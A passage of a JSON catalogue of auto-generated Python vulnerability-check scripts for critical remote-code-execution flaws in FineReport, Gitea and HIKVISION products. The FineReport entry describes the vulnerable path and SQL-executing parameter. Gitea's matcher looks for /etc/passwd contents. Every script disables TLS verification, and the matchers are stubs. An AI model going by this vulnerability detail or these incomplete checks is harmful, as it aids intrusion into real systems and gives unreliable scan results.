      # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'report?{{string}}&n=1147' | status HTTP [200, 302]\"\n\n        # Simple word matcher simulation\n        matchers = ['report?{{string}}&n=1147']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"FineReport SQLi - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_finereport_sqli_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: finereport-sqli-rce\nName: FineReport SQLi - Remote Code Execution\nSeverity: critical\nDescription: Access URL:/webroot/decision/view/ReportServer?test=&n=, which can execute the SQL statement in GET parameter n. This vulnerability is caused by Fanruan's own sqlite-jdbc-x.x.x.x.jar driver.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_finereport_sqli_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"finereport-sqli-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"FineReport SQLi - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'report?{{string}}&n=1147' | status HTTP [200, 302]\"\n\n        # Simple word matcher simulation\n        matchers = ['report?{{string}}&n=1147']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"FineReport SQLi - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_finereport_sqli_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "finereport",
          "rce",
          "sqli",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_gitea_rce",
        "name": "Gitea 1.4.0 - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Gitea 1.4.0 is vulnerable to remote code execution.",
        "severity": "critical",
        "detection": "[AND] regex ['root:.*:0:0:'] | mot(s) 'application/octet-stream'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: gitea-rce\nName: Gitea 1.4.0 - Remote Code Execution\nSeverity: critical\nDescription: Gitea 1.4.0 is vulnerable to remote code execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_gitea_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"gitea-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Gitea 1.4.0 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:.*:0:0:'] | mot(s) 'application/octet-stream'\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:', 'application/octet-stream']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Gitea 1.4.0 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_gitea_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: gitea-rce\nName: Gitea 1.4.0 - Remote Code Execution\nSeverity: critical\nDescription: Gitea 1.4.0 is vulnerable to remote code execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_gitea_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"gitea-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Gitea 1.4.0 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:.*:0:0:'] | mot(s) 'application/octet-stream'\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:', 'application/octet-stream']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Gitea 1.4.0 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_gitea_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "gitea",
          "rce",
          "unauth",
          "edb",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_hikvision_fastjson_rce",
        "name": "HIKVISION applyCT Fastjson - Remote Command Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "The HIKVISION comprehensive security management platform applyCT has a remote command execution vulnerability in a low version of Fastjson, through which an attacker can execute arbitrary commands to obtain server privileges",
        "severity": "critical",
        "detection": "[AND] mot(s) 'dns' | mot(s) '\"code\":, \"msg\":' | mot(s) 'text/json'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: hikvision-fastjson-rce\nName: HIKVISION applyCT Fastjson - Remote Command Execution\nSeverity: critical\nDescription: The HIKVISION comprehensive security management platform applyCT has a remote command execution vulnerability in a low version of Fastjson, through which an attacker can execute arbitrary commands to obtain server privileges\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_hikvision_fastjson_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"hikvision-fastjson-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"HIKVISION applyCT Fastjson - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'dns\\' | mot(s) \\'\"code\":, \"msg\":\\' | mot(s) \\'text/json\\''\n\n        # Simple word matcher simulation\n        matchers = ['dns', '\"code\":, \"msg\":', 'text/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"HIKVISION applyCT Fastjson - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_hikvision_fastjson_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: hikvision-fastjson-rce\nName: HIKVISION applyCT Fastjson - Remote Command Execution\nSeverity: critical\nDescription: The HIKVISION comprehensive security management platform applyCT has a remote command execution vulnerability in a low version of Fastjson, through which an attacker can execute arbitrary commands to obtain server privileges\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_hikvision_fastjson_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"hikvision-fastjson-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"HIKVISION applyCT Fastjson - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'dns\\' | mot(s) \\'\"code\":, \"msg\":\\' | mot(s) \\'text/json\\''\n\n        # Simple word matcher simulation\n        matchers = ['dns', '\"code\":, \"msg\":', 'text/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"HIKVISION applyCT Fastjson - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", 